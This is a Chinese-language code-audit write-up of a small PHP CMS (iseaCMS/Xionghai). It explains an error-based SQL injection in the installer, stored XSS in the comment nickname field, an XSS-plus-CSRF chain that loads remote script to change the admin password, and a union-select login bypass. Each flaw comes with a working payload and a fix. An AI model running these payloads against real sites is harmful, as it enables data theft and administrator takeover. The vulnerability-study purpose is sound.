\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/xdtb1I0ZiboeHAhp-5\_0pQ)

**0x****001 前言:**
=================

熊海 CMS 是一款小型的内容管理系统，可以用于入门的审计学习。

#### **0x002: 网站目录结构:**

iseaCMS\_1.0

├──admin            网站后台

├──css               网站 css,js 的一些静态文件

├──files              网站主页面和一些功能函数

├──images            图片

├──inc                连接数据库的一些配置文件

├──install              网站安装目录

├──seacmseditor        第三方的编辑器

├──template           网站模板

├──upload             网站文件上传目录

├──index.php     入口文件, 直接包含到 / files/index.php 主页文件

**0x003:** **安装处存在的 sql 注入:**
=============================

**漏洞分析:**

漏洞存在的位置在安装时候的 install/install.php

可以看到代码逻辑是通过判断是否有 InstalLock.txt 来判断是否需要安装

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5k4hhic9ZMOp9NRSxTTGjQawaWiaxYLocG4iaGw6pmtqQ5ePUN6nNicQPdvQ/640?wx_fmt=png)

对传入的 user 参数没有经过过滤直接插入到了下面的 update 语句, mysql\_error 直接输出了报错信息, 比较常见的报错注入

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kh0bAo9ELiaiamfibRkuTqrfyFzSvzaaZ7wg76WASBum3ib50J3A8HOLtyQ/640?wx_fmt=png)

**Payload:**

1' and(updatexml(1,concat(0x7e,(select user()),0x7e),1));#

下面只需要在管理账号这一栏插入我们的 payload, 然后在插入的时候就会显示报错

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kHrickW2saUJaoicUPICXKicPhJlRY0wa2CHA7Mng2OpSCo0DS7qsIAQqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5krTfNNtEs16uHK8PQGxsWHC8CELrQWtHG2QSGuw4f9x3ib0umqnFpcgQ/640?wx_fmt=png)

**修复建议:**

可以看到设置的编码是 utf-8 编码的, 我们进行转义

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kpK0EUSPT8vJXTwQZ4AdcGKXUfibILdN0Pf8ZLK0bh0Ut4zWn6TvLricw/640?wx_fmt=png)

我们定义一个函数来进行转义, 因为字符编码是 utf-8 的所以我们就可以进行转义, 使用 mysql\_real\_escape\_string 函数来进行一个转义从而正确的预防 sql 注入

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5k9Bpyg7uoP7XfoEUPD2FQx4tFiajhRKwzoSe1icXp7k4w0gxPlQjjlibCQ/640?wx_fmt=png)

**0x004** **前台存储型 xss:**
========================

**漏洞分析:**

漏洞位置在 files/submit.php

首先打开了 session, 对传入的 type 进行了 addslashes 进行转义, 5-13 行接受的参数没有进行过滤, 如果没有进行二次过滤所以存在存储型 xss, 接着往下看

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kgFmpwGddHfiagywo7BJEYlvLbEvMyvJ5VtzjGibkAd4kSJ6gv2204hjA/640?wx_fmt=png)

可以看到在 35 行使用了正则对输入的评论内容进行匹配, preg\_match("/(\[\\x81-\\xfe\]\[\\x40-\\xfe\]) 对 GBK 中文编码的匹配, 如果评论中不包含中文字符就会提示, 接着向下看

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kLSzC8nIa76eD7jngkzOp9ukVdibzcB0mrm4XiaKHL9T1o2NpKXNV0bYg/640?wx_fmt=png)

在 43-45 行对输入的 url 进行判断, 然后对 Content 进行了过滤, 除去 HTML 代码然后进行了 addslashes 进行了转义, 防止了 xss 的输入, 但是在昵称的地方没有任何的过滤导致我们评论处在填写昵称的时候有一处存储型 xss 漏洞, 参数是 name, 主要攻击目标是用户

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kyQCtoH81lSHzwCob3Aqyl6MbLWFFKTMk1z95FEickG7ialFeA5Iqwm1g/640?wx_fmt=png)

**修复建议:**

使用 htmlentities 对输出的内容进行实体编码来进行修复

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kVia0iaGfqNRHx8IOicLeymv33C5kJvPKf0Jopxso1zChlsflupdkgTN2Q/640?wx_fmt=png)

**0x005** **修改管理员密码  存储型 xss+csrf:**
====================================

**漏洞分析:**

先看 / admin/files/commentlist.php

在 188 行的位置会从数据库中取出来留言信息, 在 209-213 行输出出来, 这里从 content 表中查询出数据后没有经过任何过滤就输出在后台了, 然后我们再跳到输入的地方看一下

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kRRicCZap4iawoaAu7OmTFZFUER1SZzEcjuzV3EuTbGuKv8wWib6d3hI9w/640?wx_fmt=png)

发现输入的地方是跟之前评论处 xss 是一样的, 这时候我们可以弹管理员的 cookie 进行 cookie 伪造进行登录

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5k4NhggItEaLJAUauF28WpLJicoXViclnjicmicC4GqhOlYgC87DGez47UuA/640?wx_fmt=png)

在 / admin/files/manageinfo.php, 看到在后台修改密码的地方只判断了俩次修改密码的地方不为空并且俩次输入的账号密码为一致的, 然后在后面就会 dm5 进行编码后插入到我们的数据库当中去, 不需要旧的密码也没有使用 token

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kcDxHJfJ6Zd6iaGnNfXchMiahfJFm1QYHn0wSMwYiad62DibaGFQuIDIhdA/640?wx_fmt=png)

所以这里存在 csrf 漏洞再结合之前的 xss 可以打出一套组合拳修改管理员的账号密码, 我们可以写一段 js 代码来进行修改管理员账号密码, 我们只需要在远程写好 js 发送 post 数据, 再使用 src 插入就可以了, 这次的主要攻击目标是管理员。

**payload:**

<script src=”http://xx.xxx.xx..xx/xx.js”></script>

**修复建议:**

同样使用 htmlentities 对输出的内容进行实体编码

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kHM3B43mxL4GUS5ZxFC8NkKRBTKUvkyiagcxVufCShBqc9YFdZ04bIWw/640?wx_fmt=png)

在修改密码的时候加上效验, 添加一个原密码的验证, 原密码是从数据库中取出来的 password 的 md5, 对输入的 md5 进行比对

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kUzlLlHiaGsJrQnLb46YXEjUkvTZkbwQawwicxcdsFx5MjxrnP3l9JNFA/640?wx_fmt=png)

**0x006** **万能密码:**
===================

**漏洞分析:**

漏洞位置 admin/files/login.php

user 没有做过滤直接插入到 sql 语句中去查询对比, 正常的万能密码这样的, 这显然是不同的, 查看一下 sql 语句

Select user\_id,user\_type,email From users Whereuser\_id=user And password=pass

我们在从数据库中查询密码的时候没有将 password 参数拼接在后面的 sql 语句中, 数据库中存储的 password 是 md5 加密的, 所以就要考虑是否可以进行绕过

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kTTax5gKy1ichG7RcSuqT7U3RBMHjGu6Ig7QVYaQv0QAicyAiaWqJHfwGw/640?wx_fmt=png)

此时 user 没有经过过滤直接拼接进入数据库中查询, password 的 md5 的判断是从数据库中取出来的值和输入的值是否相同, 我们可以进行伪造账号密码来进行登录

**payload:**

```
user: 1' union select 1,2,3,'c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#
password:1
```

在第四个位置是一串 md5,md5 的值 = 1, 第四个位置的 md5 值必须是 password 的 md5 值, 此方法就等于伪造了一个管理员账号进行登录, 这是正常查询管理员登录的表

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kC8ibBiaicwIoicKcqT3Siam8Pj9KOrQ1ESSKDicdPgabKpicQqYk0ib8UDRqew/640?wx_fmt=png)

使用 union 的方法, 临时在 manage 下面插入临时的字段, 并且添加的值是我们可控的, 所以我们插入我们的 payload 就是通过传入新的 md5 加密后的 password, 达到绕过的效果

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5k8VEuT4uKiaUBNQCbVuEJ89KictibmAZNiaVwOUYIxZtVp4AEoSFpOGKoSg/640?wx_fmt=png)

根据之前发现的 sql 注入发现此处也是存在 sql 注入的, 就不再多说

**修复建议:**

对 user 传入的参数进行一个过滤, 跟之前 sql 注入做的防御是一样的, 在外部创建一个 php 文件直接 include 调用也可以

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5JI4sKyrsoECoN0T7Lhr5kjFkPwnj0mPVn8Idu4qjeQZa4GaASv7eOtLXnvPExM4l6gCbP4xUY1Q/640?wx_fmt=png)

**打个小广告![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHqDK7nUt0r4cTMowP5rvmPQaCXibNQ4y03aSkE9BmDJqVTyVou7gTbjfk7cKbC3JhkhZrzicDeH9YQ/640?wx_fmt=png)有兴趣的师傅可以看看哈![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHqDK7nUt0r4cTMowP5rvmPscoI4OdjibvGlBm1L9xG4mqGiciaZicfx5y7DCXSSFfGGxQL2Vy97A9dMg/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHqDK7nUt0r4cTMowP5rvmPme34QalaeD5n8fQbhfcMzdwZqF9so02f7IztPemY1mUTUlibPzTaWuw/640?wx_fmt=png)

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)  

[干货 | 常用渗透漏洞 poc、exp 收集整理](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485181&idx=3&sn=9eb034dd011ac71c4e3732129c332bb3&chksm=ea37f9a7dd4070b1545a9cb71ba14c8ced10aa30a0b43fb5052aed40da9ca43ac90e9c37f55a&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)  

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)  如果对你有所帮助，点个分享、赞、在看呗！